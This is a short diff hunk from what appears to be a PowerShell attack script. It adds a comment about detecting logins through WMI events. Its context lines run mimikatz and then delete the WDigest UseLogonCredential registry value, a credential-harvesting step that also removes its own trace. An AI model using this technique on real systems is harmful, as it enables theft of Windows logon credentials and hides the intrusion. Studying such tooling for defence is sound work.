@@ -2841,6 +2841,7 @@ Main
         }
     }
 
+    #Above should work for console login as well but the below code is better and more relaible as it uses WMI events to detect login.
     else
     {
         $actionblock = {& $mimikatz;Sleep 5; Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential }
